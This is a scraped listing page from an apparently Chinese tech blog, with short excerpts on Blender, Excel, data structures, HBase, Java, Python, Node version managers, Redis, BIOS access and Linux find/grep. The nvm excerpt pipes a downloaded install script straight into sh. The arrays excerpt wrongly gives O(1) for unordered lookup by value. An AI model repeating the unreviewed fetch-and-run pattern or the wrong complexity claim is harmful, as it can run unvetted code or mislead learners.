N是右边的隐藏的属性栏会出现. 找不到左边工具栏的时候按下T
tab 由object mode 进入edit mode
按Z 可以进入线框模式并且可以对选中的object进行移动
按E 可以编辑复制点,线,面, 著名的挤出.
ctrl + R 环形切割 shift+c 游标回到原点
按住shift可以同时选中多个物体.
view selected 模式可以对特别小物体放大看
ALT+ M merge 不同的顶点到一个
E 把整个二维的图形给拉厚.
P把subobject分离为object, ctrl+j 把不同的物体合并为一个
L或者ctrl+L 选中连接的区域
ctrl+ 鼠标左键可以快速添加点,线,面. 而且他们可以自动辨别边的角度, 如果用E的话, 只能每次自己调整边的角度.
修改器: 右边属性栏的扳手一样的图标. subdivision修改器. 左边细分, 右边平滑.. W可以把他们调出来.但是W里面的细分不能再修改,属性栏的细分可以无限修改
ctrl+ B 倒角, 用处, 想要把正方形的各个角变平滑,结果用细分修改器发现他变成了一个球,这个时候就进入edit mode, 然后全选所有的边, 然后ctrl+B, 就变成了一个光滑的正方体.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/649c7e70697daea2f11a8434ea7130f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2582ac7f25eb9be7d77983511c013624/" rel="bookmark">
			excel学习--从基础开始3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、查找替换：若是将“苏州”替换成“苏州市”（注：假如直接替换，文档中存在的苏州市会变成苏州市市）。需要在替换的时候，打开“选项”，选中“单元格匹配”（按照单元格匹配，平时的时候用的不多，平时不选中）
替换颜色：Ctrl+f打开“查找替换—选项—格式—查找格式”
模糊替换：将所有带有“工资“字样的都换成”钱“，查找替换时可用“*工资”（此处的*可以表示很多字），若是前面变成“？？工资“表示”工资“前面只有两个字。*，？都表示通配符。
若是遇到特别特殊的情况，字中出现通配符，需要选择替换的时候，比如张*，可以写成张~*（使通配符不生效）
2、批注：选中单元格—右键选择“插入批准“。审阅—显示所有批注（所有批注都不隐藏了）
批注形状修改：一般默认为矩形框，假如想要修改，先插入一个图形，选中图形—绘图工具—选中编辑形状右键—添加到快速访问工具栏--（再编辑批注的时候选中矩形框就可以编辑图形）
批注修改背景图片：编辑批注，选中批注的框，右键—设置批注格式—颜色与线条—颜色“填充效果的图片”
定位ctrl+g，选择定位条件中的“批注”，所有带批注的都选中，也可选择其他类型。
批注在在审视中寻找。
3、局域填充：选中若干单元格，输入“1”，按住ctrl+enter，区域全部填充“1”
将所有空的单元格都等于上方那个：选中所有要如此填充的区域，ctrl+g，定位条件选择“空值”，输入“=↑”，然后按住ctrl+enter
删除excel中的所有隐藏的图片：ctrl+g，“定位条件--对象”
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8853a61ecc981c5e0f08024559417508/" rel="bookmark">
			[数据结构] 数组与链表的优缺点和区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 概述 数组　是将元素在内存中连续存放，由于每个元素占用内存相同，可以通过下标迅速访问数组中任何元素。但是如果要在数组中增加一个元素，需要移动大量元素，在内存中空出一个元素的空间，然后将要增加的元素放在其中。同样的道理，如果想删除一个元素，同样需要移动大量元素去填掉被移动的元素。如果应用需要快速访问数据，很少插入和删除元素，就应该用数组。
链表　中的元素在内存中不是顺序存储的，而是通过存在元素中的指针联系到一起，每个结点包括两个部分：一个是存储 数据元素 的　数据域，另一个是存储下一个结点地址的 指针。 如果要访问链表中一个元素，需要从第一个元素开始，一直找到需要的元素位置。但是增加和删除一个元素对于链表数据结构就非常简单了，只要修改元素中的指针就可以了。如果应用需要经常插入和删除元素你就需要用链表。
内存存储区别 数组从栈中分配空间, 对于程序员方便快速,但自由度小。
链表从堆中分配空间, 自由度大但申请管理比较麻烦.　逻辑结构区别 数组必须事先定义固定的长度（元素个数），不能适应数据动态地增减的情况。当数据增加时，可能超出原先定义的元素个数；当数据减少时，造成内存浪费。　链表动态地进行存储分配，可以适应数据动态地增减的情况，且可以方便地插入、删除数据项。（数组中插入、删除数据项时，需要移动其它数据项）　总结 1、存取方式上，数组可以顺序存取或者随机存取，而链表只能顺序存取；　2、存储位置上，数组逻辑上相邻的元素在物理存储位置上也相邻，而链表不一定；　3、存储空间上，链表由于带有指针域，存储密度不如数组大；　4、按序号查找时，数组可以随机访问，时间复杂度为O(1)，而链表不支持随机访问，平均需要O(n)；　5、按值查找时，若数组无序，数组和链表时间复杂度均为O(1)，但是当数组有序时，可以采用折半查找将时间复杂度降为O(logn)；　6、插入和删除时，数组平均需要移动n/2个元素，而链表只需修改指针即可；　7、空间分配方面： 数组在静态存储分配情形下，存储元素数量受限制，动态存储分配情形下，虽然存储空间可以扩充，但需要移动大量元素，导致操作效率降低，而且如果内存中没有更大块连续存储空间将导致分配失败； 链表存储的节点空间只在需要的时候申请分配，只要内存中有空间就可以分配，操作比较灵活高效；
原文地址：http://blog.csdn.net/amazing7/article/details/51362071 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/948e50949ca53d2ba1c2d90af589fb1b/" rel="bookmark">
			Apache顶级项目介绍7 － HBase
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们来继续介绍Apache顶级项目大数据三巨头之一的HBase。恰逢今天(5.24)是HBase Con2016旧金山盛会，比较应景，而且还有朋友@Luke Han去演讲Kylin。
1. 官网简介：
老样子，HBase官网的介绍， "HBase is the Hadoop database, a distributed, scalable, big data store."，所以HBase = Hadoop Database，并且提供了分布式可扩展的数据存储。（HBase的官网直接差评，像API文档，唯一亮点是有部分中文文档）
我们之前的系列提到过，HBase是源自2006年OSDI的Google论文BigTable, Chad Walters和Jim受其启发于2007年即实现了HBase. 类似Google BigTable使用GFS作为文件存储系统，HBase利用Hadoop的HDFS作为其文件系统；Google用MapReduce来处理bigtable中的海量数据，HBase用Hadoopd的MapReduce来处理；同样Google使用Chubby作为协同服务，HBase采用Zookeeper。大家是不是感慨山寨的威力啊？就差Made in China?
2. HBase功能及作用
HBase有什么功能作用呢？同样我们回顾一下当年Google为什么会研发BigTable吧。Google当年面临一个大的挑战，如何能实时搜索互联网内容？它的方案是需要把互联网内容缓存，并基于海量的缓存上提供快速实时查询。所以有了：
GFS : 解决分布式，可扩展的文件存储系统。
BigTable: 分布式存储，管理PB级别结构化数据并提供实时查询。
MapReduce: 处理分布式计算。
好吧官网给出如下建议，HBase作为大型分布式数据库，更像是一个Data Store多于Data Base。却少很多RDBMS重要特性如列类型，触发器，高级查询语言，高级事务等。请确信有足够数据，如达上亿或者上千亿行以上数据，或者上百万列；如果只有几百万行则RDBMS更加。
另外HBase是一个面向列的数据库。大概解释一些列式数据库吧。
行式数据库把一行中所有数据串在一起存储；Row-based storages stores a table in a sequence of rows. 列式则把一列数据串在一起存储，如我们熟悉的Sybase IQ; 上图：
这样查询中选择的列就自动索引了；如果查询部分字段会大大减少读取数据量，并且可以做到高压缩算法( 5- 20 倍)存储列，对于null的列并不占用存储空间，所以表可以设计的非常稀疏。 当然有利有弊，其弊端带来是insert/update较麻烦。
3. HBase数据结构
HBase介于Map Entry(Key/Value)与DB Row, 更类似Memcache。我们由微观到宏观慢慢讲解。
HBase最底层数据结构是一个四维数据模型包含如下图结构：
ROWKEY: 行键，主键；行键是保证速度的核心。下面会重点介绍。
Column Family: 列族，数据在行中按照列族来组织，每行列族必须相同，但行之间相同列族不需要要有相同列修饰符。如：prod:name, prod:type都是prod列族。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/948e50949ca53d2ba1c2d90af589fb1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23e7734a152a331e6f473f24d8d9b468/" rel="bookmark">
			java 内存映射处理大文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中用内存映射处理大文件 2012-06-20 14:16 tobacco5648 tobacco5648博客 字号：T |T 在处理大文件时，如果利用普通的FileInputStream 或者FileOutputStream 抑或RandomAccessFile 来进行频繁的读写操作，都将导致进程因频繁读写外存而降低速度.如下为一个对比实验。
AD： 51CTO 网+ 第十二期沙龙：大话数据之美_如何用数据驱动用户体验
在处理大文件时，如果利用普通的FileInputStream 或者FileOutputStream 抑或RandomAccessFile 来进行频繁的读写操作，都将导致进程因频繁读写外存而降低速度.如下为一个对比实验。
package test; import java.io.BufferedInputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.io.RandomAccessFile; import java.nio.MappedByteBuffer; import java.nio.channels.FileChannel; public class Test { public static void main(String[] args) { try { FileInputStream fis=new FileInputStream("/home/tobacco/test/res.txt"); int sum=0; int n; long t1=System.currentTimeMillis(); try { while((n=fis.read())&gt;=0){ sum+=n; } } catch (IOException e) { // TODO Auto-generated catch block e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23e7734a152a331e6f473f24d8d9b468/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6b835a3efc2060db19780c2b3476e6b/" rel="bookmark">
			Java单例模式的各种写法和最优写法推荐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		话不多说，直接上代码：
（1）
//只适合单线程环境，懒汉模式 class Singleton{ private static Singleton Instance = null; public Singleton() { } public static Singleton getInstance(){ if(Instance==null){ Instance = new Singleton(); } return Instance; } } 评价：由于只生成一个实例，为防止别人创建该类实例，构造方法为私有属性，只有在实例对象为空时才去创建（为避免重复创建）。 //饿汉模式 class Singleton{ private static Singleton Instance = new Singleton(); public Singleton() { } public static Singleton getInstance(){ return Instance; } }评价：开始的时候就创建一个final类型的静态实例对象，以后不会再改变。//双重判断class Singleton{ private static Singleton Instance = null; public Singleton() { } public static Singleton getInstance(){ if(Instance==null){ synchronized (Singleton.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6b835a3efc2060db19780c2b3476e6b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a4ba273fc03687aa5eea0178d877974/" rel="bookmark">
			python 实现将字典写入csv文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		shutdown={"yunfeiyang":{"username":"yunfeiyang","binding_house":{0:"1",1:"2"},"register_time":"2018-20"}}
import csv
csvfile = file('csvtest.csv', 'wb')
writer = csv.writer(csvfile)
writer.writerow(['username','binding_hourse','register_time'])
list1=[]
for i in shutdown.values():
s=tuple(list(i.values()))
list1.append(s)
writer.writerows(list1)
转载于:https://blog.51cto.com/linuxnewstar/1782526
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa356e91d7be2e1d491f2efec44838c7/" rel="bookmark">
			几种免费的数据库建模工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一个：ERDesigner NG
官方网址是：http://mogwai.sourceforge.net/?Welcome:ERDesigner_NG
第二个：ModelRight3
官方网址为：http://www.modelright.com/Default.aspx
第三，OpenSystemArchitect（推荐产品）
官方网址是：http://www.codebydesign.com/
这是一个开源做得比较彻底的一个产品，推荐大家使用。
最喜欢的一点说法是操作习惯有点类似于PowerDesigner，界面比PD丑一点，但是，还挺好用的！
它支持windows、Linux
第四个：MySQL WorkBench
官方网址：http://dev.mysql.com/workbench/
Mysql官方出的设计工具，for mysql
如果你是使用mysql，也可以考虑一下它！
无论使用哪一种工具，我在设计的过程中都全用EXCEL做一个表结构设计文档；做到建模结构跟EXCEL中的结果同步（要随时同步）；EXCEL是为了留档，工具是为了DDL，展示讲解用（建模图比较直观）。
转载于:https://www.cnblogs.com/duadu/p/6166981.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f09adadd325965e7b4f3c16ff0a7b038/" rel="bookmark">
			python的sort()函数详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数 sort()用于列表中元素的排序
list.sort() 不会返回对象，会改变原有的list (这点与sorted()不同，sorted()函数会返回一个列表，而sort（）函数是直接在原来的基础上修改，其次注意语法) 函数sort()会默认地按升序排列，能否让sort()函数按我们想要的排列方式进行排列呢？
**sort()函数原型: list.sort(key=None, reverse=False)**
(1) key参数 key接受的是一个只有一个形参的函数，形式如下
def f(a): return len(a)
key接受的函数返回值，表示此元素的权值，sort将按照权值大小进行排序 (2) reverse参数 reverse接受的是一个bool类型的值 (Ture or False),表示是否颠倒排列顺序,一般默认的是False，注意第一个字母是大写的 补充说明： 在python2里面的sort()函数是有三个参数的： L.sort(cmp=None, key=None, reverse=False) 其中的cmp在python里面已经被删除了，但是还是说明一下
cmp参数： cmp接受一个函数，拿整形举例，形式为: def f(a,b): return a-b
如果排序的元素是其他类型的， 你所定义的这个函数只需满足a逻辑小于b，函数返回负数；a逻辑等于b，函数返回0；a逻辑大于b，函数返回正数就行了
cmp()函数本身在python2里是一个内置函数
cmp(42,32) 1 cmp(99,100) -1 cmp(10,10) 0
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a17089ac3b5969d9809ee0b37acf3d1/" rel="bookmark">
			ENVI5.1删除残余注册表信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一次安装ENVI5.1时，忘记添加license.dat，想卸载重新安装，结果卸载过程出错，没有完全卸载干净，导致再次安装时始终报错： 解决方案：删除注册表中的残余项（两个位置：注册表，及C盘目录）： 安装ENVI5.1的时间是2016年5月17下午3点左右，所以确定了是{08550FB3-F6FF-4FFF-A7C8-183999A440BE}，证明是对的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3ba6e7b0e9ffdd99f0e6a927f8e8565/" rel="bookmark">
			利用nvm管理nodejs
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nvm全称Node Version Manager，它与n的实现方式不同，其是通过shell脚本实现的。
安装方式有两种：
$ curl https://raw.github.com/creationix/nvm/v0.4.0/install.sh | sh 或者
$ wget -qO- https://raw.github.com/creationix/nvm/v0.4.0/install.sh | sh 以上脚本会把nvm库clone到~/.nvm，然后会在~/.bash_profile, ~/.zshrc或`~/.profile末尾添加source，安装完成之后，你可以用以下命令来安装node
$ nvm install 0.10 使用指定的版本
$ nvm use 0.10 查看当前已经安装的版本
$ nvm ls .nvm -&gt; v0.10.24 查看正在使用的版本
$ nvm current v0.10.24 以指定版本执行脚本
$ nvm run 0.10.24 myApp.js 卸载nvm
$ rm -rf ~/.nvm
详细文档请参考官方文档
https://github.com/creationix/nvm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95a4570a199bd853417af0299dd5d7d4/" rel="bookmark">
			利用N来管理nodejs的版本问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		n是Node的一个模块，作者是TJ Holowaychuk（鼎鼎大名的Express框架作者）
安装很简单：
$ sudo npm install -g n
安装完成之后，直接输入n后输出当前已经安装的node版本以及正在使用的版本（前面有一个o），你可以通过移动上下方向键来选择要使用的版本，最后按回车生效。
$ n
0.10.1 0.10.15 o 0.10.21 0.11.8
如果你要安装其他的版本（比如0.11.12），那么如下：
$ n 0.11.12
install : 0.11.12
mkdir : /usr/local/n/versions/0.11.12
fetch : http://nodejs.org/dist/v0.11.12/node-v0.11.12-darwin-x64.tar.gz
#### 5.9%
安装最新的版本
$ n latest
安装稳定版本
$ n stable
删除某个版本
$ n rm 0.10.1 以指定的版本来执行脚本
$ n use 0.10.21 some.js
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5042fbc60098cc94d59a2618766b03c2/" rel="bookmark">
			Java单例设计模式的几种写法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 中单例模式是一种常见的设计模式，单例模式的写法有好几种，这里主要介绍三种：懒汉式单例、饿汉式单例、登记式单例。 单例模式有以下特点： 1、单例类只能有一个实例。 2、单例类必须自己创建自己的唯一实例。 3、单例类必须给所有其他对象提供这一实例。 单例模式确保某个类只有一个实例，而且自行实例化并向整个系统提供这个实例。在计算机系统中，线程池、缓存、日志对象、对话框、打印机、显卡的驱动程序对象常被设计成单例。这些应用都或多或少具有资源管理器的功能。每台计算机可以有若干个打印机，但只能有一个Printer Spooler，以避免两个打印作业同时输出到打印机中。每台计算机可以有若干通信端口，系统应当集中管理这些通信端口，以避免一个通信端口同时被两个请求同时调用。总之，选择单例模式就是为了避免不一致状态，避免政出多头。
一、懒汉式
1.线程不安全 public class Singleton { private Singleton() {} private static Singleton single; public static Singleton getInstance() { if (single == null) { single = new Singleton(); } return single; } } 2.线程安全 public class Singleton { private Singleton() {} private static Singleton single; public static synchronized Singleton getInstance() { if (single == null) { single = new Singleton(); } return single; } } 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5042fbc60098cc94d59a2618766b03c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebd52e247af03419bf2546c845ffc1dd/" rel="bookmark">
			微服务架构的优势与不足
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：http://blog.daocloud.io/microservices-1/?utm_source=tuicool&amp;utm_medium=referral
编者的话｜本文来自 Nginx 官方博客，是微服务系列文章的第一篇，主要探讨了传统的单体式应用的不足，以及微服务架构的优势与挑战。
作者介绍：Chris Richardson，是世界著名的软件大师，经典技术著作《POJOS IN ACTION》一书的作者，也是 cloudfoundry.com 最初的创始人，Chris Richardson 与 Martin Fowler、Sam Newman、Adrian Cockcroft 等并称为世界十大软件架构师。
Chris Richardson 所著所有文章已独家授权 DaoCloud 翻译并刊载。
本期内容 微服务在当下引起广泛关注，成为文章、博客、社交媒体讨论和大会演讲的热点；在 Gartner 的 “Hype Cycle” 上排名也非常靠前。与此同时，在软件社区也有人质疑微服务并非新事物。反对者认为微服务只是 SOA （Service Oriented Architecture）的二度包装。然而，无论是追捧还是质疑，微服务架构拥有巨大优势，尤其是它让敏捷开发和复杂的企业应用交付成为可能。
本系列包含 7 篇文章，介绍了微服务的设计、构建和部署，并与传统的单体架构进行了比较。本系列将分析微服务架构的各种因素，你也将了解微服务架构模型的优劣、是否适合你的项目，以及如何应用。
Chris Richardson 微服务系列全 7 篇：
1. 微服务架构概念解析
2. 构建微服务架构：使用 API Gateway
3. 深入微服务架构的进程间通信
4. 服务发现的可行方案以及实践案例
5. 微服务的事件驱动数据管理
6. 选择微服务部署策略
7. 将单体应用改造为微服务
首先让我们了解为何要将微服务纳入考量。
构建单体应用 假设我们要开发一款全新的与 Uber 和 Hailo 竞争的打车软件。在前期的会议和需求整理后，你要么需要手动创建一个新项目，要么可以使用 Rails、Spring Boot、Play 或者 Maven 来生成。这个新应用可能采用了六边形架构模块，如下图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebd52e247af03419bf2546c845ffc1dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/baa75fd89e306ab1c04f2d9af3f8c1a8/" rel="bookmark">
			SQL Server 如何实现&#34;选择所有行&#34;和&#34;编辑所有行&#34;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在SQL Server 2008中默认可选择和可编辑前200行。有时候，我们数据很多，200行根本无法完全显示，那么我们该如何做呢？
方法：【工具】----【选项】----【SQL Server对象资源管理器】----【命令】，把其中的“编辑前&lt;n&gt;行命令的值”和“选择前&lt;n&gt;行命令的值”都改为 “0”。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5e2fa52914159c3aa846bea2e16e89f/" rel="bookmark">
			搭建Spring MVC&#43;JedisCluster集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系统：Ubuntu
开发工具：eclipse
JDK：1.8
服务器：Tomcat8.0
Redis：3.0.7
搭建流程：
1.搭建spring框架，见文章：http://blog.csdn.net/u012810317/article/details/51452604
2.在pom.xml中添加Redis依赖:
&lt;!-- redis --&gt;
&lt;dependency&gt;
&lt;groupId&gt;redis.clients&lt;/groupId&gt;
&lt;artifactId&gt;jedis&lt;/artifactId&gt;
&lt;version&gt;2.8.1&lt;/version&gt;
&lt;/dependency&gt;
3.在springMVC-servlet.xml中添加以下内容：
&lt;context:component-scan base-package="com.springmvc.repository" use-default-filters="false"&gt;
&lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Repository" /&gt;
&lt;/context:component-scan&gt;
4.在src/main/resources下创建connect-redis.properties文件；文件内容如下：
address1=192.168.56.102:7000
address2=192.168.56.102:7001
address3=192.168.56.103:7000
address4=192.168.56.103:7001
address5=192.168.56.104:7000
address6=192.168.56.105:7001
5.在src/main/java中创建com.springmvc.repository包，并在包中创建JedisClusterFactory.java；内容如下：
package com.springmvc.repository;
import java.io.InputStream;
import java.util.HashSet;
import java.util.Properties;
import java.util.Set;
import java.util.regex.Pattern;
import org.apache.commons.pool2.impl.GenericObjectPoolConfig;
import org.springframework.beans.factory.FactoryBean;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.stereotype.Repository;
import redis.clients.jedis.HostAndPort;
import redis.clients.jedis.JedisCluster;
@Repository
public class JedisClusterFactory implements FactoryBean&lt;JedisCluster&gt;, InitializingBean {
private InputStream is;
private String addressKeyPrefix ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5e2fa52914159c3aa846bea2e16e89f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d79b900cdbe96bf5cc636f2680c50ee1/" rel="bookmark">
			csdn博客c币积分获取及管理方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 http://blog.csdn.net/evangel_z/article/details/7256840 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7720bd758a28545a6b43903f36954f1a/" rel="bookmark">
			intellij idea无法访问静态资源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 http://www.zhihu.com/question/23077380/answer/23539375 知乎上面的一个帖子 静态文件不应该放在WEB-INF下面，java web容器认为这是私有目录，不允许直接访问。导致的问题是页面html文件内容有,但是图片文件无法访问。 解决办法:将存放图片的static文件夹放置webapp目录下。static和WEB-INF是同一级目录** 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4079fb4e6052c1fa20b7a2ca7f53490/" rel="bookmark">
			【Redis源码剖析】  -  Redis IO操作之rio
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原创作品，转载请标明：http://blog.csdn.net/xiejingfa/article/details/51433696
Redis源码剖析系列文章汇总：传送门
Reids内部封装了一个I/O层，称之为rio。今天我们就来简单介绍一下rio模块的具体实现。
本文主要涉及rio.h和rio.c两个文件。
1、rio结构体 关于文件读写操作和buffer的操作主要基于rio对象进行操作，我们先来看看rio结构体的定义，如下：
/* 系统IO操作的封装 */ struct _rio { /* Backend functions. * Since this functions do not tolerate short writes or reads the return * value is simplified to: zero on error, non zero on complete success. */ /* 后端方法：函数的返回值为0表示发生错误，返回值为非0表示操作成功。 */ // 数据流读操作 size_t (*read)(struct _rio *, void *buf, size_t len); // 数据流写操作 size_t (*write)(struct _rio *, const void *buf, size_t len); // 读或写操作的当前偏移量 off_t (*tell)(struct _rio *); // flush操作 int (*flush)(struct _rio *); /* The update_cksum method if not NULL is used to compute the checksum of * all the data that was read or written so far.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4079fb4e6052c1fa20b7a2ca7f53490/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de327956945be3ccf8f7f89ee4b4db33/" rel="bookmark">
			联想win10进bios的正确方式，并不是按键！！！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我在使用VM虚拟机的时候，由于虚拟化VT没有开启的原因，需要进 bios 进行设置。
当时弹出的提示是这样的 ，我是 VMware Workstation 10版本，装的是win7家庭普通版64位。 （已将该虚拟机配置为使用64位客户机操作系统。但是，无法执行64位操作。）
我的电脑是 联想E430C 的，以前的还原系统的时候进过一次，我记得当时特别难进。我也记不清了，还得搜：
一般结果是这样的，这是百度经验的结果
“这里我用我的thinkpad E430c给大家做个演示，首先和往常一样按开机，在这个界面记得要按Fn+F12，联想键盘的新功能键太难用了，干嘛都得先按FN，当然这个也是可以关闭的，回头我再也个经验给大家讲。”
反反复复很多次，反正我的是完全不行。还有说要关快速启动的，也没有什么用。于是bing搜
根据主板的品牌不同启动bios启动热键也不同，整理了这个表基本涵盖了所有品牌主板、笔记本电脑、以及品牌台式机的bios启动热键，仅供参考： 组装机主板 品牌笔记本 品牌台式机 主板品牌 启动按键 笔记本品牌 启动按键 台式机品牌 启动按键 华硕主板 F8 联想笔记本 F12 联想台式机 F12 技嘉主板 F12 宏基笔记本 F12 惠普台式机 F12 微星主板 F11 华硕笔记本 ESC 宏基台式机 F12 映泰主板 F9 惠普笔记本 F9 戴尔台式机 ESC 梅捷主板 ESC或F12 联想Thinkpad F12 神舟台式机 F12 七彩虹主板 ESC或F11 戴尔笔记本 F12 华硕台式机 F8 华擎主板 F11 神舟笔记本 F12 方正台式机 F12 斯巴达卡主板 ESC 东芝笔记本 F12 清华同方台式机 F12 昂达主板 F11 三星笔记本 F12 海尔台式机 F12 双敏主板 ESC IBM笔记本 F12 明基台式机 F8 翔升主板 F10 富士通笔记本 F12 精英主板 ESC或F11 海尔笔记本 F12 冠盟主板 F11或F12 方正笔记本 F12 富士康主板 ESC或F12 清华同方笔记本 F12 顶星主板 F11或F12 微星笔记本 F11 铭瑄主板 ESC 明基笔记本 F9 盈通主板 F8 技嘉笔记本 F12 捷波主板 ESC Gateway笔记本 F12 Intel主板 F12 eMachines笔记本 F12 杰微主板 ESC或F8 索尼笔记本 ESC 致铭主板 F12 磐英主板 ESC 磐正主板 ESC 冠铭主板 F9 注意：其它机型请尝试或参考以上品牌常用启动热键 这上面热键组合键我几乎都试了，没有一个可以。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de327956945be3ccf8f7f89ee4b4db33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5e17b9f634e16f483639a12c05f6ca9/" rel="bookmark">
			linux命令  find、grep
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自 ： http://www.cnblogs.com/skynet/archive/2010/12/25/1916873.html
在linux下面工作，有些命令能够大大提高效率。本文就向大家介绍find、grep命令，他哥俩可以算是必会的linux命令，我几乎每天都要用到他们。本文结构如下：
find命令 find命令的一般形式find命令的常用选项及实例find与xargs grep命令 grep命令的一般形式grep正则表达式元字符集(基本集)grep命令的常用选项及实例 1、find命令 find命令是一个无处不在命令，是linux中最有用的命令之一。find命令用于：在一个目录（及子目录）中搜索文件，你可以指定一些匹配条件，如按文件名、文件类型、用户甚至是时间戳查找文件。下面就通过实例来体验下find命令的强大。
1.1、find命令的一般形式 man文档中给出的find命令的一般形式为：
find [-H] [-L] [-P] [-D debugopts] [-Olevel] [path...] [expression]
其实[-H] [-L] [-P] [-D debugopts] [-Olevel]这几个选项并不常用（至少在我的日常工作中，没有用到过），上面的find命令的常用形式可以简化为：
find [path...] [expression]
path：find命令所查找的目录路径。例如用.来表示当前目录，用/来表示系统根目录 expression：expression可以分为——“-options [-print -exec -ok ...]” -options，指定find命令的常用选项，下节详细介绍 -print，find命令将匹配的文件输出到标准输出 -exec，find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为'command' { } \;，注意{ }和\；之间的空格 find ./ -size 0 -exec rm {} \; 删除文件大小为零的文件 （还可以以这样做：rm -i `find ./ -size 0` 或 find ./ -size 0 | xargs rm -f &amp;） 为了用ls -l命令列出所匹配到的文件，可以把ls -l命令放在find命令的-exec选项中：find .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5e17b9f634e16f483639a12c05f6ca9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcd86022daff4f665feb327f22f3bccd/" rel="bookmark">
			Spring Securty 4.1.0 基本概念说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Securty基本概念说明 1.概述 1.1 Spring Security 中的基本概念和逻辑 Spring Security （简称SS） 用于解决Java应用中的安全管理控制问题，这其中包含两个关键环节：
认证授权 “认证”的含义是对动作主体进行标识的过程，其结果是认证成功或者不成功。认证成功后，动作主体就可以继续以经过认证的安全主体身份发起对安全对象的操作。否则，将不可能继续后续操作。
“授权”是在安全主体对安全对象进行操作前的权限检查过程。只有通过该检查，安全主体才能够成功操作安全对象。
Spring Security 围绕以上两个过程提供了基本的技术框架。
